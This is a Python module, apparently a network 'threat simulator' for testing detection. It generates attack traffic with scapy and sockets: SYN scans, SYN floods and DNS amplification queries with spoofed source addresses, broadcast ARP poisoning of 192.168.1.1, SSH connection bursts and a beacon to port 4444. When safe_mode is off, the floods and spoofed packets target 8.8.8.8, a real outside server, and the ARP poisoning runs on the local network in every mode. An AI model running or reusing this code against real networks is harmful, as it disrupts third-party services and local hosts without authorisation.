import threading
import time
import socket
import random
try:
    import logging
    logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
    from scapy.all import send, sendp, IP, TCP, UDP, ARP, Ether, DNS, DNSQR
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False

from typing import Dict, Any

class ThreatSimulator:
    def __init__(self):
        self.active_simulations: Dict[str, Dict[str, Any]] = {}
        self.lock = threading.Lock()
        
    def start(self, sim_id, sim_type, intensity, safe_mode):
        with self.lock:
            existing = self.active_simulations.get(sim_id)
            if existing:
                if existing["running"]:
                    # Genuinely still running — reject
                    return False
                else:
                    # Stale stopped entry — evict it so we can re-use the slot
                    self.active_simulations.pop(sim_id, None)

            self.active_simulations[sim_id] = {
                "type": sim_type,
                "intensity": intensity,
                "safe_mode": safe_mode,
                "running": True,
                "packets_sent": 0
            }

        t = threading.Thread(target=self._run_simulation, args=(sim_id,))
        t.daemon = True
        t.start()
        return True

    def stop(self, sim_id):
        with self.lock:
            if sim_id in self.active_simulations:
                self.active_simulations[sim_id]["running"] = False
                return True
        return False

    def reset(self):
        """Force-clear ALL simulation state (emergency recovery)."""
        with self.lock:
            for v in self.active_simulations.values():
                v["running"] = False
            self.active_simulations.clear()

    def get_status(self):
        with self.lock:
            return {k: {"type": v["type"], "packets": v["packets_sent"]}
                    for k, v in self.active_simulations.items() if v["running"]}
            
    def _run_simulation(self, sim_id):
        # Snapshot config immediately so we never need to re-read from the dict
        with self.lock:
            conf = self.active_simulations.get(sim_id)
            if not conf:
                return  # Already evicted before thread started
            sim_type  = conf["type"]
            intensity = conf["intensity"]
            safe_mode = conf["safe_mode"]

        target_ip = "127.0.0.1" if safe_mode else "8.8.8.8"
        fake_src  = "10.0.0.55"  if safe_mode else "192.168.1.100"
        delay     = max(0.001, 1.0 / (intensity * 10))

        def _is_running():
            """Safe check — returns False if key was deleted or running=False."""
            with self.lock:
                entry = self.active_simulations.get(sim_id)
                return bool(entry and entry.get("running"))

        def _inc_packets():
            with self.lock:
                entry = self.active_simulations.get(sim_id)
                if entry:
                    entry["packets_sent"] = entry.get("packets_sent", 0) + 1

        try:
            while _is_running():
                try:
                    if sim_type == "port_scan":
                        self._nmap_scan(target_ip, fake_src)
                        time.sleep(delay * 10)
                    elif sim_type == "syn_flood":
                        self._syn_flood(target_ip, fake_src)
                        time.sleep(delay / 5)
                    elif sim_type == "dns_amp":
                        self._dns_amp(target_ip, fake_src)
                        time.sleep(delay)
                    elif sim_type == "arp_poison":
                        if SCAPY_AVAILABLE:
                            self._arp_poison()
                        else:
                            self._udp_blast(target_ip)
                        time.sleep(delay * 5)
                    elif sim_type == "c2_beacon":
                        self._c2_beacon(target_ip)
                        time.sleep(1.0)
                    elif sim_type == "brute_force":
                        self._brute_force(target_ip)
                        time.sleep(delay * 2)
                    _inc_packets()
                except Exception:
                    # Fallback: plain UDP probe — never crashes, never needs dict
                    try:
                        self._udp_blast(target_ip)
                    except Exception:
                        pass
                    _inc_packets()
                    time.sleep(delay)
        finally:
            # Always clean up — even if BaseException or KeyboardInterrupt
            with self.lock:
                self.active_simulations.pop(sim_id, None)
                
    # --- Attack implementations ---
    def _nmap_scan(self, target_ip, src_ip):
        if SCAPY_AVAILABLE:
            for port in [21, 22, 23, 80, 443, 445, 3389, 8080]:
                pkt = IP(src=src_ip, dst=target_ip)/TCP(sport=random.randint(1025, 65000), dport=port, flags="S")
                send(pkt, verbose=False)
        else:
            self._tcp_connect_scan(target_ip)
            
    def _syn_flood(self, target_ip, src_ip):
        if SCAPY_AVAILABLE:
            pkt = IP(src=src_ip, dst=target_ip)/TCP(sport=random.randint(1025, 65000), dport=80, flags="S")
            send(pkt, verbose=False)
        else:
            self._udp_blast(target_ip)
            
    def _dns_amp(self, target_ip, src_ip):
        if SCAPY_AVAILABLE:
            # Spoof source IP to target, send request to Google DNS
            pkt = IP(src=src_ip, dst="8.8.8.8")/UDP(sport=random.randint(1025, 65000), dport=53)/DNS(rd=1, qd=DNSQR(qname="google.com", qtype="ALL"))
            send(pkt, verbose=False)
        else:
            self._udp_blast(target_ip, port=53)
            
    def _arp_poison(self):
        # Target router and victim - wrapping in Ether and using sendp prevents missing MAC warnings
        pkt1 = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=2, pdst="192.168.1.1", psrc="192.168.1.100", hwdst="ff:ff:ff:ff:ff:ff")
        sendp(pkt1, verbose=False)
        
    def _brute_force(self, target_ip):
        # Rapid connections to port 22
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.1)
            s.connect((target_ip, 22))
            s.close()
        except OSError:
            pass
            
    def _c2_beacon(self, target_ip):
        # periodic HTTP-like traffic to a random high port
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.sendto(b"HEARTBEAT_DATA", (target_ip, 4444))
            s.close()
        except OSError:
            pass

    def _udp_blast(self, target_ip, port=80):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.sendto(b"X" * 100, (target_ip, port))
            s.close()
        except OSError:
            pass

    def _tcp_connect_scan(self, target_ip):
        for port in [21, 22, 80]:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.05)
                s.connect((target_ip, port))
                s.close()
            except OSError:
                pass

simulator_engine = ThreatSimulator()
